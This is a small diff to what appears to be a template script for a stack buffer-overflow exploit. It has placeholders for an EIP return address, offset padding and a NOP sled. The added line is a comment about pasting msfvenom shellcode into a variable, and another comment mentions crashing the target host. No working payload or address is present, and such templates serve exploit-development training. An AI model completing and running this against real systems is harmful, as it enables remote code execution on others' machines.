@@ -13,6 +13,7 @@ EIP = "[little endian hexcode static memory address]"
 ## Enter the amount of byte space that seperates EIP and ESP.
 EIP_to_ESP = "C" * [byte space between EIP and ESP]
 nops = "\x90" * 20
+## Insert the metasploit shellcode below enclosed by quotes WITHOUT the semicolon at the end.
 shellcode = ("[shellcode from msfvenom]")
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
